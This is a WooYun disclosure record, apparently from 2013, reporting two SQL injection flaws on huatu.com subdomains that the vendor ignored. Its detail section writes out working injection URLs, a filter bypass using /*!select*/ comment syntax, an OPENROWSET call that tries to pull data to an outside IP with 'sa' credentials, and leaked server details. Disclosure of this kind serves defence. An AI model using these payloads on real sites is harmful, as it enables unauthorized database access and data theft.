{"id": 8105, "wybug_id": "wooyun-2013-043097", "wybug_title": "华图教育分站SQL注入两处", "wybug_corp": "华图教育", "wybug_author": "sql", "wybug_date": "2013-11-18 19:27", "wybug_open_date": "2013-11-23 19:27", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "16", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 华图教育分站SQL注入一枚 详细说明：  注入点：http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&classtype=202&province=7&SubjectType=3&id=24976随手打个单引号如下图：http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&classtype=202&province=7&SubjectType=3&id=24976'\n\nSELECT n.Title,n.ClassNo,n.Price,n.hits,n.ActualPrice,n.SubjectType,n.ShortTitle,n.scaleimg,p.Course_type, p.Course_price, p.Course_number,s.SubjectName from NetClasses n,Cl_Course_Price p,NetClassSubjects s where n.rid=p.Course_id and n.SubjectType=s.rid and n.status=1 and n.videoType=5 and n.rid=24976‘Filename: E:\\svn_1dui1\\system\\database\\DB_driver.php数据库出错  还爆出了路径。肯定存在注入。最开始我以为php一般和mysql是一对好基友，谁知道这次可奇葩，竟然是mssql.看下图http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&classtype=202&province=7&SubjectType=3&id=24976 and 1=@@version\n\nMicrosoft SQL Server 2000 - 8.00.2039 (Intel X86) May 3 2005 23:18:38 Copyright (c) 1988-2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)还是mssql2000我用http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&classtype=202&province=7&SubjectType=3&id=24976 and host_name()=@@servername测试返回失败。说明是站库分离的。后来我又测试http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&classtype=202&province=7&SubjectType=3&id=24976;select a.* FROM OPENROWSET('SQLOLEDB','xx.xx.xx.xxx,443';'sa';'sa','select * FROM pubs.dbo.authors') as a;--也没弹回来。难道数据库服务器不能上网？算了，备份没戏了。放SQLMAP里跑吧\n\n数据库名是：HTOLMain接下来就接着跑吧   都懂的  我就不浪费电了。   漏洞证明：  另外一处SQL注入点是这个：http://sl.huatu.com/ArcList.php?act=1http://sl.huatu.com/ArcList.php?act=1' and 'a'='a 正常http://sl.huatu.com/ArcList.php?act=1' and 'a'='b 不正常典型的字符注入点本来我想直接 放SQLMAP里  我就看片去了。谁知道片看完了 也没跑出来。算了 亲自上阵吧。测了测才发现 他可能有 防注入的东东，一出现select 之类 就会死掉了。后来这样就可以了。http://sl.huatu.com/ArcList.php?act=1' and 1=2 union all /*!select*/ 1,2,3,concat_ws(\":\",@@version,user(),@@datadir,database()),5,6,7,8,9,10,11,12,13,14%23\n\n5.1.62-log:htol_shenlun@211.151.49.15:/usr/local/mysql/var/:... 好了 版本 数据库名 用户名什么的都出来了。知道怎么绕过以后 再上工具吧吧select替换一下就可以了。\n\n在这里设置一下即可。然后就扫出来了\n\n主要后台我没扫出来。懒的深入了好了  收工，看片去了。   修复方案：  过滤   版权声明：转载请注明来源 sql@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-23 19:27 厂商回复：  漏洞Rank：6  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-19 22:13 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  对这样的厂商 我只能说 呵呵你一脸    \n     2013-11-23 19:57 |    \t\t看官 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 暂无)\t\t \n  洞补上了   无影响    \n     2013-11-23 20:07 |    \t\txx123 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 雷锋)\t\t \n  、、、、、、、、、强烈建议乌云出个厂商信誉排名表@xsser    \n     2013-11-23 21:18 |    \t\tsql  \t\t\t( 核心白帽子 |\t\t\t        Rank:1127 漏洞数:145        | 带着两个MM（mysql,mssql），玩3p（asp,php...)\t\t \n  其实厂商们的信誉，白帽子们都看在眼里的。 他们不确认  就没人再给他们做安全检测了，以后自己的站点因为其他漏洞受到损失 他们就就得不偿失了    \n     2013-11-28 15:16 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  mark!前排关注,还好wooyun肯定了你的工作    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}